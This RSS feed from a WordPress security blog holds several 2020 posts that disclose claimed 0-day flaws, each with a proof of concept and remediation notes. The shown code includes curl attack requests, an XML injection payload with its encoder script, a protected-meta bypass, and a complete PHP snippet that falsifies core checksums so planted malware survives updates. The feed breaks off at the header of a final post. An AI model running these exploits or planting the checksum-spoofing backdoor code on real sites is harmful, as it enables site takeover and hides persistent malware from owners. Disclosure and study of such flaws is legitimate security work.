<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
	xmlns:content="http://purl.org/rss/1.0/modules/content/"
	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
	xmlns:dc="http://purl.org/dc/elements/1.1/"
	xmlns:atom="http://www.w3.org/2005/Atom"
	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
	>

<channel>
	<title>core &#8211; WP deeply</title>
	<atom:link href="https://wpdeeply.com/category/core/feed/" rel="self" type="application/rss+xml" />
	<link>http://wpdeeply.com/</link>
	<description>// Silence is golden.  Not for you!</description>
	<lastBuildDate>Sun, 11 Oct 2020 21:31:11 +0000</lastBuildDate>
	<language>en-US</language>
	<sy:updatePeriod>
	hourly	</sy:updatePeriod>
	<sy:updateFrequency>
	1	</sy:updateFrequency>
	<generator>https://wordpress.org/?v=5.5.3</generator>
	<item>
		<title>WordPress attachment api functions and any post type</title>
		<link>https://wpdeeply.com/wordpress-attachment-api-functions-and-any-post-type/</link>
		
		<dc:creator><![CDATA[root]]></dc:creator>
		<pubDate>Sun, 09 Aug 2020 20:09:17 +0000</pubDate>
				<category><![CDATA[core]]></category>
		<category><![CDATA[plugins]]></category>
		<category><![CDATA[0day]]></category>
		<guid isPermaLink="false">https://wpdeeply.com/?p=27</guid>

					<description><![CDATA[Core had put some efforts in order to prevent accessing&#160;attachment&#160;post type functions from another post types. Usually checks are done by calling&#160;get_post&#160;and comparing the post type with&#160;attachment, but that is selective and only in hand picked places. It is that way because performances mainly, so many functions are lacking this checks. Eli5 PoC One of &#8230;<p class="read-more"> <a class="" href="https://wpdeeply.com/wordpress-attachment-api-functions-and-any-post-type/"> <span class="screen-reader-text">WordPress attachment api functions and any post type</span> Read More &#187;</a></p>]]></description>
										<content:encoded><![CDATA[
<p>Core had put some efforts in order to prevent accessing&nbsp;<code>attachment</code>&nbsp;post type functions from another post types. Usually checks are done by calling&nbsp;<code>get_post</code>&nbsp;and comparing the post type with&nbsp;<code>attachment</code>, but that is selective and only in hand picked places. It is that way because performances mainly, so many functions are lacking this checks.</p>



<h2>Eli5 PoC</h2>



<p>One of them, that calls another attachment related is&nbsp;<code>wp_update_image_subsizes</code>&nbsp;and there we have the following calls up to&nbsp;<code>path_join</code>where we have <a rel="noreferrer noopener" href="https://wpdeeply.com/wordpress-and-phar-unserialize/" target="_blank">phar unserialize</a> or&nbsp;<code>wp_create_image_subsizes</code>&nbsp;where <a rel="noreferrer noopener" href="https://wpdeeply.com/wordpress-null-byte-to-rce-0-day-bug/" target="_blank">image editor RCE ?!</a> is in game, but also&nbsp;<code>getimagesize</code>&nbsp;as phar unserialize appears too.</p>



<ul><li><code>wp_update_image_subsizes</code><ul><li><code>wp_get_attachment_metadata</code></li><li><code>wp_get_original_image_path</code><ul><li><code>wp_attachment_is_image</code></li><li><code>wp_get_attachment_metadata</code></li><li><code>get_attached_file</code></li><li><code>path_join</code></li></ul></li></ul></li></ul>



<p>this function is called in&nbsp;<code>wp_ajax_media_create_image_subsizes</code></p>



<pre class="wp-block-code"><code lang="php" class="language-php">function wp_ajax_media_create_image_subsizes() {
	check_ajax_referer( 'media-form' );

	if ( ! current_user_can( 'upload_files' ) ) {
		wp_send_json_error( array( 'message' => __( 'Sorry, you are not allowed to upload files.' ) ) );
	}

	if ( empty( $_POST['attachment_id'] ) ) {
		wp_send_json_error( array( 'message' => __( 'Upload failed. Please reload and try again.' ) ) );
	}

	$attachment_id = (int) $_POST['attachment_id'];

	if ( ! empty( $_POST['_wp_upload_failed_cleanup'] ) ) {
		// Upload failed. Cleanup.
		if ( wp_attachment_is_image( $attachment_id ) &amp;&amp; current_user_can( 'delete_post', $attachment_id ) ) {
			$attachment = get_post( $attachment_id );

			// Created at most 10 min ago.
			if ( $attachment &amp;&amp; ( time() - strtotime( $attachment->post_date_gmt ) &lt; 600 ) ) {
				wp_delete_attachment( $attachment_id, true );
				wp_send_json_success();
			}
		}
	}

	// Set a custom header with the attachment_id.
	// Used by the browser/client to resume creating image sub-sizes after a PHP fatal error.
	if ( ! headers_sent() ) {
		header( 'X-WP-Upload-Attachment-ID: ' . $attachment_id );
	}

	// This can still be pretty slow and cause timeout or out of memory errors.
	// The js that handles the response would need to also handle HTTP 500 errors.
	wp_update_image_subsizes( $attachment_id );
...
</code></pre>



<p>where&nbsp;<code>attachment_id</code>&nbsp;could be any post&nbsp;<code>ID</code>&nbsp;from any&nbsp;<code>post_type</code>. So if&nbsp;<code>author</code>&nbsp;user role grabs the&nbsp;<code>_wpnonce</code>&nbsp;from&nbsp;<code>wp-admin/media-new.php</code>&nbsp;could perform the request below with ‚Äúattacking‚Äù post ID.</p>



<pre class="wp-block-code"><code lang="bash" class="language-bash">curl 'http://local.target/wp-admin/admin-ajax.php' -H 'Cookie: ...' --data 'action=media-create-image-subsizes&amp;_ajax_nonce=[media-form-nonce]&amp;attachment_id=[any-post-id-with-protected-atachment-meta]' --compressed
</code></pre>



<p>How to add protected meta into posts?! Check the facts below. <img src="https://s.w.org/images/core/emoji/13.0.0/72x72/1f642.png" alt="üôÇ" class="wp-smiley" style="height: 1em; max-height: 1em;" /></p>



<h2>Few facts</h2>



<ul><li>Yoast Duplicate posts is <a href="https://plugins.trac.wordpress.org/browser/duplicate-post/trunk/duplicate-post-admin.php#L637" target="_blank" rel="noreferrer noopener">adding protected</a> meta when cloning if meta / custom field key starts with&nbsp;<code>\_</code></li><li>We had already seen the <a href="https://wpdeeply.com/wordpress-importer-arbitrary-post-create/" target="_blank" rel="noreferrer noopener">wordpress-importer in action</a></li><li>WooCommerce had fixed something similar <a rel="noreferrer noopener" href="https://raw.githubusercontent.com/woocommerce/woocommerce/master/CHANGELOG.txt" target="_blank">few months</a> ago in 4.1.0 version</li></ul>



<h2>Remediation</h2>



<ul><li>make sure that&nbsp;<code>attachment</code>&nbsp;routines are performed only over attachments</li><li>do not allow users to create protected meta</li></ul>
]]></content:encoded>
					
		
		
			</item>
		<item>
		<title>WordPress and phar unserialize</title>
		<link>https://wpdeeply.com/wordpress-and-phar-unserialize/</link>
		
		<dc:creator><![CDATA[root]]></dc:creator>
		<pubDate>Fri, 07 Aug 2020 20:41:00 +0000</pubDate>
				<category><![CDATA[core]]></category>
		<category><![CDATA[0day]]></category>
		<guid isPermaLink="false">https://wpdeeply.com/?p=43</guid>

					<description><![CDATA[Core team had put some effort into project in order to preven unserialize of user input via&#160;phar&#160;stream wrapper. In general, efforts are good, but to excelent there are two more grades and this is the max with this approach. In the core there is function&#160;path_join&#160;that accepts two parameters&#160;$base&#160;and&#160;$path.&#160;$path&#160;is then sent towards function&#160;path_is_absolute&#160;and from the code &#8230;<p class="read-more"> <a class="" href="https://wpdeeply.com/wordpress-and-phar-unserialize/"> <span class="screen-reader-text">WordPress and phar unserialize</span> Read More &#187;</a></p>]]></description>
										<content:encoded><![CDATA[
<p>Core team had put some effort into project in order to preven unserialize of user input via&nbsp;<code>phar</code>&nbsp;stream wrapper. In general, efforts are good, but to excelent there are two more grades and this is the max with this approach. In the core there is function&nbsp;<code>path_join</code>&nbsp;that accepts two parameters&nbsp;<code>$base</code>&nbsp;and&nbsp;<code>$path</code>.&nbsp;<code>$path</code>&nbsp;is then sent towards function&nbsp;<code>path_is_absolute</code>&nbsp;and from the code</p>



<pre class="wp-block-code"><code lang="php" class="language-php">function path_is_absolute( $path ) {
	/*
	 * Check to see if the path is a stream and check to see if its an actual
	 * path or file as realpath() does not support stream wrappers.
	 */
	if ( wp_is_stream( $path ) &amp;&amp; ( is_dir( $path ) || is_file( $path ) ) ) {
		return true;
	}
...
</code></pre>



<p>it is obvious that&nbsp;<code>wp_is_stream</code>&nbsp;will return&nbsp;<code>TRUE</code>&nbsp;for&nbsp;<code>phar://path_here</code>&nbsp;and will reach&nbsp;<code>is_dir</code>&nbsp;and/or&nbsp;<code>is_file</code>&nbsp;which will trigger unserialize of user input in WP.</p>



<h2>Eli5 PoC</h2>



<p>In&nbsp;<code>wp_restore_image</code>&nbsp;function which could be called by any user with upload rights on WP (author user role by default) there is the following flow:</p>



<pre class="wp-block-code"><code lang="php" class="language-php">...
$backup_sizes     = get_post_meta( $post_id, '_wp_attachment_backup_sizes', true );
...
if ( isset( $backup_sizes['full-orig'] ) &amp;&amp; is_array( $backup_sizes['full-orig'] ) ) {
		$data = $backup_sizes['full-orig'];
...
		$restored_file = path_join( $parts['dirname'], $data['file'] );
		$restored      = update_attached_file( $post_id, $restored_file );

</code></pre>



<p>There it is, unserialize of user input. How to place custom values in&nbsp;<code>_wp_attachment_backup_sizes</code>, check the facts <img src="https://s.w.org/images/core/emoji/13.0.0/72x72/1f642.png" alt="üôÇ" class="wp-smiley" style="height: 1em; max-height: 1em;" /></p>



<h2>Few facts</h2>



<ul><li><code>import</code>&nbsp;capability is <a rel="noreferrer noopener" href="https://wpdeeply.com/wordpress-importer-arbitrary-post-create/" target="_blank">fatal</a> for WP because arbitrary post create from low permission user roles</li><li>this is how to meddle with <a rel="noreferrer noopener" href="https://wpdeeply.com/wordpress-attached-file-meta/" target="_blank">attached file</a> via <a rel="noreferrer noopener" href="https://wpdeeply.com/wordpress-importer-and-attached-file/" target="_blank">importer</a></li><li><code>path_join</code>&nbsp;is wide spread across <a rel="noreferrer noopener" href="https://wpdirectory.net/search/01EF5E56NN5S9VHK7BMQ9XF3BZ" target="_blank">eco system</a></li><li>no need for <a href="https://wpdeeply.com/wordpress-upload-any-file-with-image-extension/" target="_blank" rel="noreferrer noopener">image polyglots</a></li></ul>



<h1>Remediation</h1>



<ul><li>phar vulnerabilities should be handled on <a href="https://github.com/TYPO3/phar-stream-wrapper" target="_blank" rel="noreferrer noopener">stream wrapper level</a>, not with ‚Äúguarding‚Äù</li></ul>
]]></content:encoded>
					
		
		
			</item>
		<item>
		<title>WordPress core and MySQL string comparison</title>
		<link>https://wpdeeply.com/wordpress-core-and-mysql-string-comparison/</link>
		
		<dc:creator><![CDATA[root]]></dc:creator>
		<pubDate>Sat, 25 Jul 2020 20:16:00 +0000</pubDate>
				<category><![CDATA[core]]></category>
		<category><![CDATA[plugins]]></category>
		<category><![CDATA[0day]]></category>
		<guid isPermaLink="false">https://wpdeeply.com/?p=31</guid>

					<description><![CDATA[If we execute the following MySQL query against WP database we will get results in case we had already uploaded media in the past This is sort of ‚Äúfeature‚Äù of MySQL RDBMS, but what this means from WP aspect. It means a lot, because in the past there were account take over / backdoor vulnerabilities &#8230;<p class="read-more"> <a class="" href="https://wpdeeply.com/wordpress-core-and-mysql-string-comparison/"> <span class="screen-reader-text">WordPress core and MySQL string comparison</span> Read More &#187;</a></p>]]></description>
										<content:encoded><![CDATA[
<p>If we execute the following MySQL query against WP database</p>



<pre class="wp-block-code"><code lang="php" class="language-php">select * from wp_postmeta where meta_key = concat(char(1),"_wp_attached_file");
</code></pre>



<p>we will get results in case we had already uploaded media in the past</p>



<pre class="wp-block-code"><code lang="bash" class="language-bash">+---------+---------+-------------------+--------------------------------+
| meta_id | post_id | meta_key          | meta_value                     |
+---------+---------+-------------------+--------------------------------+
|      46 |      92 | _wp_attached_file | 2020/07/wpdeeply.png#/boom.png |
|      71 |      99 | _wp_attached_file | wpdeeply                       |
+---------+---------+-------------------+--------------------------------+
2 rows in set (0.00 sec)

</code></pre>



<p>This is sort of ‚Äúfeature‚Äù of MySQL RDBMS, but what this means from WP aspect. It means a lot, because in the past there were account take over / backdoor vulnerabilities fixed silently and today we are going to focus on&nbsp;<code>update_metadata</code>&nbsp;function. WordPress prevents medling with protected meta via&nbsp;<code>is_protected_meta</code>&nbsp;function which basically checks if&nbsp;<code>meta_key</code>&nbsp;starts with&nbsp;<code>_</code>, but that isn‚Äôt enough because it is on PHP side.</p>



<p>Eli5 PoC</p>



<p>Upload media file on your test WP instance and grab the&nbsp;<code>post_id</code>. Then run the following code snippet with your own data / post_id:</p>



<pre class="wp-block-code"><code lang="php" class="language-php">function bypass_protected_meta(){
    //your demo media(post) id
    $post_id = 99;
    
    $meta_key = "\x11_wp_attached_file";
    $meta_value = "wpdeeply";
    
    //into edit post meta capability there is check for protected meta, but this is for auditorium to be much more clearer 
    if ( current_user_can( 'edit_post_meta', $post_id, $meta_key ) &amp;&amp; ! is_protected_meta($meta_key) ){
        update_post_meta($post_id, $meta_key, $meta_value);
    }
}

add_action(init, "bypass_protected_meta");
</code></pre>



<p>Refresh the media (will not be displayed) and if you check in DB&nbsp;<code>_wp_attached_file</code>&nbsp;will have the&nbsp;<code>wpdeeply</code>&nbsp;value. Is this bug with impact? Well Jetpack folks will need to answer that&nbsp;<a href="https://github.com/Automattic/jetpack/blob/master/json-endpoints/class.wpcom-json-api-update-post-v1-2-endpoint.php#L824">https://github.com/Automattic/jetpack/blob/master/json-endpoints/class.wpcom-json-api-update-post-v1-2-endpoint.php#L824</a>, but you can find a lot of use cases on wpdirectory <img src="https://s.w.org/images/core/emoji/13.0.0/72x72/1f642.png" alt="üôÇ" class="wp-smiley" style="height: 1em; max-height: 1em;" /></p>



<h2>Few facts</h2>



<ul><li>This MySQL behaviour is for huge set of utf-8 characters not only ascii control ones</li><li>Why this <a rel="noreferrer noopener" href="https://stackoverflow.com/questions/543580/equals-vs-like/2336940#2336940" target="_blank">happens</a>&nbsp;</li><li>There are more places around WP code where unexpected behaviour is in game, because at the end of the day WP is just PHP &amp; MySQL web app</li><li>Meddling with protected meta on WP is RCE. Few examples: <a rel="noreferrer noopener" href="https://wpdeeply.com/wordpress-null-byte-to-rce-0-day-bug/" target="_blank">here</a>, <a rel="noreferrer noopener" href="https://wpdeeply.com/wordpress-write-image-to-any-directory-rce/" target="_blank">here</a> and <a rel="noreferrer noopener" href="https://wpdeeply.com/wordpress-write-image-to-any-directory-rce/" target="_blank">here</a>. There are few not disclosed too <img src="https://s.w.org/images/core/emoji/13.0.0/72x72/1f642.png" alt="üôÇ" class="wp-smiley" style="height: 1em; max-height: 1em;" /></li></ul>



<h2>Remediation</h2>



<ul><li>be careful with data used in MySQL WHERE</li><li><code>is_protected_meta</code>&nbsp;should be DB/MySQL check against current setup instead PHP one</li></ul>
]]></content:encoded>
					
		
		
			</item>
		<item>
		<title>WordPress importer arbitrary post create</title>
		<link>https://wpdeeply.com/wordpress-importer-arbitrary-post-create/</link>
		
		<dc:creator><![CDATA[root]]></dc:creator>
		<pubDate>Thu, 23 Jul 2020 20:18:00 +0000</pubDate>
				<category><![CDATA[core]]></category>
		<category><![CDATA[plugins]]></category>
		<category><![CDATA[0day]]></category>
		<guid isPermaLink="false">https://wpdeeply.com/?p=33</guid>

					<description><![CDATA[Native WordPress importer have 3 different parser classes:&#160;WXR_Parser_SimpleXML,&#160;WXR_Parser_XML&#160;and&#160;WXR_Parser_Regex. If first two required PHP extensions (simplexml&#160;and&#160;xml) aren‚Äôt installed or somehow they fail during export file parsing, then everything should be done by&#160;WXR_Parser_Regex&#160;class. Failing could occure because: malformed XML file Huge XML file with lot of data (libxml doesn‚Äôt obay memory constraints from php.ini) most important one: &#8230;<p class="read-more"> <a class="" href="https://wpdeeply.com/wordpress-importer-arbitrary-post-create/"> <span class="screen-reader-text">WordPress importer arbitrary post create</span> Read More &#187;</a></p>]]></description>
										<content:encoded><![CDATA[
<p>Native WordPress importer have 3 different parser classes:&nbsp;<code>WXR_Parser_SimpleXML</code>,&nbsp;<code>WXR_Parser_XML</code>&nbsp;and&nbsp;<code>WXR_Parser_Regex</code>. If first two required PHP extensions (<code>simplexml</code>&nbsp;and&nbsp;<code>xml</code>) aren‚Äôt installed or somehow they fail during export file parsing, then everything should be done by&nbsp;<code>WXR_Parser_Regex</code>&nbsp;class.</p>



<p>Failing could occure because:</p>



<ul><li>malformed XML file</li><li>Huge XML file with lot of data (libxml doesn‚Äôt obay memory constraints from php.ini)</li><li>most important one: those extensions can‚Äôt parse XML data that holds ascii control characters in it.</li></ul>



<p>In the&nbsp;<code>WXR_Parser_Regex</code>&nbsp;we have following</p>



<pre class="wp-block-code"><code lang="php" class="language-php">foreach ( $multiline_tags as $tag => $handler ) {
	// Handle multi-line tags on a singular line
	if ( preg_match( '|&lt;' . $tag . '>(.*?)|is', $importline, $matches ) ) {
...
</code></pre>



<p>and this means that somewhere in the user input if there is&nbsp;<br><code>&lt; / item &gt;</code>&nbsp;we talk about end of the post. We all know that meta / custom fields can hold anything, so we have our entry point. Fallback towards&nbsp;<code>WXR_Parser_Regex</code>&nbsp;checked and entry point checked, time for demo.</p>



<h2>Eli5 PoC</h2>



<p>On any WP instance log in with&nbsp;<code>contributor</code>&nbsp;user role. Create blog post and add meta / custom field with following value <img src="https://s.w.org/images/core/emoji/13.0.0/72x72/1f642.png" alt="üôÇ" class="wp-smiley" style="height: 1em; max-height: 1em;" /> Template payload for meta value:</p>



<pre class="wp-block-code"><code lang="xml" class="language-xml">&lt;/wp:meta_value>&lt;/wp:postmeta>&lt;/item>
[asciicontrol]
&lt;item>
&lt;title>Attack-Post-1337&lt;/title>
&lt;link>http://attack.post/2020/07/19/attack-post/&lt;/link>
&lt;pubDate>Sun, 19 Jul 2020 20:57:17 +0000&lt;/pubDate>
&lt;dc:creator>attacker&lt;/dc:creator>
&lt;guid isPermaLink="false">http://attack.post?p=1337&lt;/guid>
&lt;description>&lt;/description>
&lt;content:encoded>&lt;!-- wp:paragraph -->
&lt;p>boom jee&lt;/p>
&lt;!-- /wp:paragraph -->&lt;/content:encoded>
&lt;excerpt:encoded>&lt;/excerpt:encoded>
&lt;wp:post_id>1337&lt;/wp:post_id>
&lt;wp:post_date>2020-07-19 20:57:17&lt;/wp:post_date>
&lt;wp:post_date_gmt>2020-07-19 20:57:17&lt;/wp:post_date_gmt>
&lt;wp:comment_status>open&lt;/wp:comment_status>
&lt;wp:ping_status>open&lt;/wp:ping_status>
&lt;wp:post_name>attack-post&lt;/wp:post_name>
&lt;wp:status>publish&lt;/wp:status>
&lt;wp:post_parent>0&lt;/wp:post_parent>
&lt;wp:menu_order>0&lt;/wp:menu_order>
&lt;wp:post_type>post&lt;/wp:post_type>
&lt;wp:post_password>&lt;/wp:post_password>
&lt;wp:is_sticky>0&lt;/wp:is_sticky>
&lt;category domain="category" nicename="uncategorized">Uncategorized&lt;/category>
&lt;wp:postmeta>
&lt;wp:meta_key>_test&lt;/wp:meta_key>
&lt;wp:meta_value>

</code></pre>



<p></p>



<p>prepare this template payload on the following way</p>



<pre class="wp-block-code"><code lang="php" class="language-php">//grab the content
$cnt = file_get_contents("attack-template.txt");
//add ascii control characters
$cnt = str_replace("[asciicontrol]", "\x00\x01\x02\x08\x16", $cnt);
//url encode it and it is ready to be used towards any meta (custom) field as value
file_put_contents("final-payload.txt", urlencode($cnt));
</code></pre>



<p>and create the meta / custom field as&nbsp;<code>contributor</code>.</p>



<pre class="wp-block-code"><code lang="bash" class="language-bash">curl 'http://local.target/wp-admin/admin-ajax.php' -H 'Cookie: ...' --data '_ajax_nonce=0&amp;action=add-meta&amp;metakeyselect=%23NONE%23&amp;metakeyinput=wpdeeply&amp;metavalue=[content_from_final-payload.txt]&amp;_ajax_nonce-add-meta=61b457d48c&amp;post_id=[your_post_id]' --compressed
</code></pre>



<p>Now log in as&nbsp;<code>administrator</code>&nbsp;export the Posts and import them anywhere you want. Say hello to extra post of any type with any data created by &nbsp;<code>contributor</code>.</p>



<h2>Few facts</h2>



<ul><li>Many mainstream plugins accept raw user input in meta / custom fields</li><li>RCE could be achieved without user/attacker interaction when import occurs. <a href="https://wpdeeply.com/wordpress-null-byte-to-rce-0-day-bug/" target="_blank" rel="noreferrer noopener">Example 1</a> and <a href="https://wpdeeply.com/wordpress-write-image-to-any-directory-rce/" target="_blank" rel="noreferrer noopener">Example 2</a></li><li><a href="https://wpdeeply.com/wordpress-updates-from-core-and-security/" target="_blank" rel="noreferrer noopener">persistence</a> and <a href="https://github.com/Slavco/wp-weaver" target="_blank" rel="noreferrer noopener">stealth agents</a> planting is 100% option in WP</li></ul>



<h2>Remediation</h2>



<ul><li>Sign the posts / data exported and check the signature with data need to be imported</li><li>Follow 101 security practices for web applications</li></ul>
]]></content:encoded>
					
		
		
			</item>
		<item>
		<title>WordPress updates from core and security</title>
		<link>https://wpdeeply.com/wordpress-updates-from-core-and-security/</link>
		
		<dc:creator><![CDATA[root]]></dc:creator>
		<pubDate>Fri, 17 Jul 2020 20:45:00 +0000</pubDate>
				<category><![CDATA[core]]></category>
		<category><![CDATA[red team]]></category>
		<category><![CDATA[0day]]></category>
		<guid isPermaLink="false">https://wpdeeply.com/?p=45</guid>

					<description><![CDATA[WordPress is on the auto-updates train for everything lately and they do it for ‚Äúsecurity‚Äù. Auto-updates from core is approach and it is same for everything, so let we see what is doing under the hood. There is function&#160;update_core&#160;and that is the place where magic is happening. WP core is deciding via&#160;get_core_checksums&#160;what files need to &#8230;<p class="read-more"> <a class="" href="https://wpdeeply.com/wordpress-updates-from-core-and-security/"> <span class="screen-reader-text">WordPress updates from core and security</span> Read More &#187;</a></p>]]></description>
										<content:encoded><![CDATA[
<p>WordPress is on the auto-updates train for everything lately and they do it for ‚Äúsecurity‚Äù. Auto-updates from core is approach and it is same for everything, so let we see what is doing under the hood. There is function&nbsp;<code>update_core</code>&nbsp;and that is the place where magic is happening. WP core is deciding via&nbsp;<code>get_core_checksums</code>&nbsp;what files need to be updated / rewritten and in this function we have this phone home call:</p>



<pre class="wp-block-code"><code lang="php" class="language-php">$http_url = 'http://api.wordpress.org/core/checksums/1.0/?' . http_build_query( compact( 'version', 'locale' ), null, '&amp;' );
$url      = $http_url;
...
$response = wp_remote_get( $url, $options );
</code></pre>



<p>e.g. phoning home is extendable by any piece of software that is on the WP instance. This means that ‚Äúsecurity‚Äù perspective is possible only for bugs that are reported towards software vendor (core, plugin, theme), but for 0days, bypasses of the fix or already compromised sites this functionality practically means nothing. There are many another ways for piece of code to survive auto-updates, but here we are going to see / understand one easy, basic and effective.</p>



<h2>Eli5 PoC</h2>



<p>In the&nbsp;<code>ABSPATH . WPINC . '/plugin.php'</code>&nbsp;or any another file included / required after, append the following code:</p>



<pre class="wp-block-code"><code lang="php" class="language-php">if ( ! function_exists("weaver_phoning_home") &amp;&amp; function_exists("add_filter") ){
    function weaver_phoning_home($response, $parsed_args, $url){
        global $weaver_current_file;
        if ( strpos($url, "api.wordpress.org/core/checksums") !== false ){
            if ( ! is_wp_error( $response ) &amp;&amp; 200 == wp_remote_retrieve_response_code( $response ) ) {
                if ( isset($response["body"]) ){
                    $body = json_decode( trim($response["body"]), true );
                    if ( is_array($body) &amp;&amp; isset($body['checksums']) &amp;&amp; is_array($body['checksums']) ) {
                        $alter_response = false;
                        foreach ( $body['checksums'] as $core_file => $md5checksum ){
                            if ( strpos($weaver_current_file, $core_file) !== false ){
                                $wmd5 = md5_file($weaver_current_file);
                                if ( $md5checksum !== $wmd5 ){
                                    $alter_response = true;
                                    $body['checksums'][$core_file] = $wmd5;
                                }
                            }
                        }
                        if ($alter_response){
                            $response["body"] = json_encode($body);
                            return $response;
                        }
                    }
                }
            }
        }
        return $response;
    }
    $weaver_current_file = __FILE__;
    add_filter('http_response', 'weaver_phoning_home', 1, 4);
}
//malware code below - any length, any logic
if ( isset($_REQUEST["wppply"])){
    exit("deeply");
}
</code></pre>



<p>Hit the update / re-install button, the code will remain in the file, stealth from update mechanism.</p>



<h2>Few facts</h2>



<ul><li>This technique will work for core / wp-cli auto-updates / updates / re-install and for every security solution that rely on those functions.</li><li>There are few more places in the WP core where effective meddling with received data is possible</li><li>Two another approaches for WP not detectable malware exists wich will be covered in the next period</li><li>With theme + plugin auto-updates, supply chain attacks will become extremely effective (theme + plugin ownership change)</li></ul>



<h2>Remediation</h2>



<ul><li>Turn off auto-updates and don‚Äôt use update / re-install WP options in the name of security</li><li>Server executable files shouldn‚Äôt be writable for server</li></ul>
]]></content:encoded>
					
		
		
			</item>
		<item>
		<title>WordPress importer and attached file</title>
		<link>https://wpdeeply.com/wordpress-importer-and-attached-file/</link>
		
		<dc:creator><![CDATA[root]]></dc:creator>
		<pubDate>Fri, 17 Jul 2020 20:38:00 +0000</pubDate>
				<category><![CDATA[core]]></category>
		<category><![CDATA[plugins]]></category>
		<category><![CDATA[0day]]></category>
		<guid isPermaLink="false">https://wpdeeply.com/?p=41</guid>

					<description><![CDATA[WordPress project have put a lot of effort to prevent meddling with&#160;_wp_attached_file&#160;meta value. Part of this effort was put into wordpress-importer plugin as part of the core, but‚Ä¶ Few versions back there was possibility to bypass those restrictions with&#160;\&#160;WP ‚Äúmagic‚Äù, but there are few more techniques. Eli5 PoC class-wp-import.php&#160;method&#160;is_valid_meta_key&#160;we have the following: and Do you &#8230;<p class="read-more"> <a class="" href="https://wpdeeply.com/wordpress-importer-and-attached-file/"> <span class="screen-reader-text">WordPress importer and attached file</span> Read More &#187;</a></p>]]></description>
										<content:encoded><![CDATA[
<p>WordPress project have put a lot of effort to prevent meddling with&nbsp;<code>_wp_attached_file</code>&nbsp;meta value. Part of this effort was put into wordpress-importer plugin as part of the core, but‚Ä¶ Few versions back there was possibility to bypass those restrictions with&nbsp;<code>\</code>&nbsp;WP ‚Äúmagic‚Äù, but there are few more techniques.</p>



<h2>Eli5 PoC</h2>



<p><code>class-wp-import.php</code>&nbsp;method&nbsp;<code>is_valid_meta_key</code>&nbsp;we have the following:</p>



<pre class="wp-block-code"><code lang="php" class="language-php">function is_valid_meta_key( $key ) {
		// skip attachment metadata since we'll regenerate it from scratch
		// skip _edit_lock as not relevant for import
		if ( in_array( $key, array( '_wp_attached_file', '_wp_attachment_metadata', '_edit_lock' ) ) )
			return false;
		return $key;
	}
</code></pre>



<p>and</p>



<pre class="wp-block-code"><code lang="php" class="language-php">add_filter( 'import_post_meta_key', array( $this, 'is_valid_meta_key' ) );
</code></pre>



<p>Do you see&nbsp;<code>_wp_attachment_backup_sizes</code>&nbsp;blocked in the code? <a href="https://wpdeeply.com/wordpress-attached-file-meta/" target="_blank" rel="noreferrer noopener">Why is that important?</a></p>



<h2>Few facts</h2>



<ul><li>There are reliable attacks against export-import process from low privileged accounts</li></ul>



<h2>Remediation</h2>



<ul><li>Don‚Äôt allow wordpress-importer to fall back on the&nbsp;<code>class WXR_Parser_Regex</code></li><li>Do not assign <strong>import</strong> user capabilities on WP related projects</li><li>Add &nbsp;<code>_wp_attachment_backup_sizes</code> in the blocked list in the wordpress-importer code</li></ul>
]]></content:encoded>
					
		
		
			</item>
		<item>
		<title>WordPress upload any file with image extension</title>
		<link>https://wpdeeply.com/wordpress-upload-any-file-with-image-extension/</link>
		
		<dc:creator><![CDATA[root]]></dc:creator>
		<pubDate>Mon, 13 Jul 2020 20:55:00 +0000</pubDate>
				<category><![CDATA[core]]></category>
		<category><![CDATA[0day]]></category>
		<guid isPermaLink="false">https://wpdeeply.com/?p=47</guid>

					<description><![CDATA[Big efforts were put into validation and verification of image uploads in WP as a project. Yet, that isn‚Äôt completed task. In the WP core there is function&#160;wp_upload_bits&#160;which allows to be ‚Äúuploaded‚Äù file with any content with any of the allowed extensions. Beside its widespread usage around eco system&#160;&#160;there are two places in the core &#8230;<p class="read-more"> <a class="" href="https://wpdeeply.com/wordpress-upload-any-file-with-image-extension/"> <span class="screen-reader-text">WordPress upload any file with image extension</span> Read More &#187;</a></p>]]></description>
										<content:encoded><![CDATA[
<p>Big efforts were put into validation and verification of image uploads in WP as a project. Yet, that isn‚Äôt completed task. In the WP core there is function&nbsp;<code>wp_upload_bits</code>&nbsp;which allows to be ‚Äúuploaded‚Äù file with any content with any of the allowed extensions. Beside its widespread usage around <a href="https://wpdirectory.net/search/01ED57DFTZ2VWRZCD4W7N80R9A">eco system</a>&nbsp;&nbsp;there are two places in the core where it is used e.g. in&nbsp;<code>xmlrpc</code>&nbsp;service&nbsp;<code>mw_newMediaObject</code>&nbsp;and in&nbsp;<code>wp_generate_attachment_metadata</code>. Via xmlrpc there straight forward upload and via attachment metadata ‚Äúimage‚Äù creation is possible via faked cover of any allowed audio / video vile. Try it yourself with mp3 and <a href="https://eyed3.readthedocs.io/en/latest/">eyeD3</a>.</p>



<h2>Eli5 PoC</h2>



<pre class="wp-block-code"><code lang="php" class="language-php">function upload_any_image(){
    wp_upload_bits("wpdeeply.jpg", "", "Learn wp deeply");    
}

add_action(init, "upload_any_image");
</code></pre>



<h2>Few facts</h2>



<ul><li><code>wp_check_filetype</code>&nbsp;checks filetype based on extension only</li><li>As default and pushed/advertised&nbsp;<code>ImageMagic</code>&nbsp;via&nbsp;<code>site-health</code>&nbsp;in the core, this is basically turning WP into webgoat for setups where file uploads are enabled</li><li>XSS attacks on many web setups</li><li>backdoors for max allowed upload file size</li></ul>



<h2>Remediation</h2>



<ul><li><code>add_filter('wp_upload_bits', ...</code>&nbsp;where bits will be placed in tmp image with specified extension and will be validated against&nbsp;<code>wp_check_filetype_and_ext</code></li><li>check how Woo fixed this in the past <img src="https://s.w.org/images/core/emoji/13.0.0/72x72/1f642.png" alt="üôÇ" class="wp-smiley" style="height: 1em; max-height: 1em;" /></li></ul>
]]></content:encoded>
					
		
		
			</item>
		<item>
		<title>WordPress null byte to RCE ‚Äì 0 day bug</title>
		<link>https://wpdeeply.com/wordpress-null-byte-to-rce-0-day-bug/</link>
		
		<dc:creator><![CDATA[root]]></dc:creator>
		<pubDate>Sun, 12 Jul 2020 21:00:00 +0000</pubDate>
				<category><![CDATA[core]]></category>
		<category><![CDATA[0day]]></category>
		<guid isPermaLink="false">https://wpdeeply.com/?p=53</guid>

